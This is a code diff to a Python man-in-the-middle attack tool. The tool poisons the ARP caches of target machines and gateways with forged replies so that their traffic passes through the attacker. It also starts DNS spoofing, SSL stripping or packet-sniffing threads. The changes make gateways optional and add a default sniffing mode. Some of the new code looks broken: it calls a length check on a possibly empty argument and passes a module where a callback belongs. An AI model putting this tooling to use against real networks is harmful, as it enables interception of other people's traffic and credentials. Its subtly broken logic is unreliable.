@@ -27,7 +27,7 @@ PORT_STEAL_SEND_DELAY = 2000  # microseconds
 def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target", type=ip_address, dest="targets", required=True, nargs="+", help="Array of target IPs")  # if you want to be able to add more
-    parser.add_argument("-g", "--gateway", type=ip_address, dest="gateways", required=True, nargs="+", help="Array of gateway IPs")
+    parser.add_argument("-g", "--gateway", type=ip_address, dest="gateways", nargs="+", help="Array of gateway IPs")
     parser.add_argument("-i", "--iface", dest="iface", default="enp0s3", help="Interface [default: %(default)s]")
 
     parser.add_argument("-o", "--oneway", dest="oneway", action="store_true", help="Do not poison gateways")
@@ -138,8 +138,8 @@ def poison_confirm(targets, gateways):
             if(pkt[ARP].psrc == target.ip):
                 for gateway in gateways:
                     if(pkt[ARP].pdst == gateway.ip):
-                        print("ARP broadcast detected")
-                        pkt.show()
+                        print("ARP broadcast detected") 
+                        # pkt.show()
                         arpReply = forge_arp(gateway.ip, target.ip, target.mac, ATTACKER_MAC, 2)
                         sendp(arpReply, iface=options.iface, verbose=options.verbose)
 
@@ -176,13 +176,17 @@ def main():
             sys.exit(0)
         targets.append(type('obj', (object,), {"mac": target_mac, "ip": target}))
 
-    for gatewayAdr in options.gateways:
-        gateway = format(gatewayAdr)
-        gateway_mac = get_mac(gateway)
-        if(gateway_mac == 0):
-            print("[!] MAC of Gateway: {} not found".format(gateway))
-            sys.exit(0)
-        gateways.append(type('obj', (object,), {"mac": gateway_mac, "ip": gateway}))
+    if options.gateways.__len__() > 0:
+        for gatewayAdr in options.gateways:
+            gateway = format(gatewayAdr)
+            gateway_mac = get_mac(gateway)
+            if(gateway_mac == 0):
+                print("[!] MAC of Gateway: {} not found".format(gateway))
+                sys.exit(0)
+            gateways.append(type('obj', (object,), {"mac": gateway_mac, "ip": gateway}))
+    else:
+        gateways = targets
+        options.oneway = True
 
     # gateways.append((get_mac(options.target), options.target))
     # gateways.append((get_mac(options.gateway), options.gateway))
@@ -218,6 +222,10 @@ def main():
     if(options.ssl_strip):
         print("[*] Starting SSL strip thread...")
         packet_sniffer.main(ssl_strip.check_packet, vic, gateways[0], attacker, options, None)
+
+    if not options.dns_spoof and not options.ssl_strip:
+        print("[*] Starting packet sniffing thread...")
+        packet_sniffer.main(packet_sniffer, vic, gateways[0], attacker, options, None)
 
     # wait for ctrl+c to exit application
     try:
